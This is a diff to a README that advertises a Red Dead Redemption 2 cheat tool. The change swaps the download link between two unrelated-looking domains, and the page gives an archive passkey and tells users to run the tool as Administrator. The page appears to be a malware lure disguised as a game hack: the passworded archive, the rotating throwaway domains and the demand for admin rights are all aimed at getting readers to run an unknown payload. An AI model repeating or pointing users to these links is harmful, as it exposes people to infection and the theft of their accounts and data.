@@ -6,7 +6,7 @@ Red Dead Redemption 2 hack with god mode, infinite stamina, unlimited money, no 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular tools like **Red Dead Trainer**, **RDR2 Mod Menu**, and **RedM 
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Red Dead Redemption 2.
 4. Run the hack **as Administrator**.
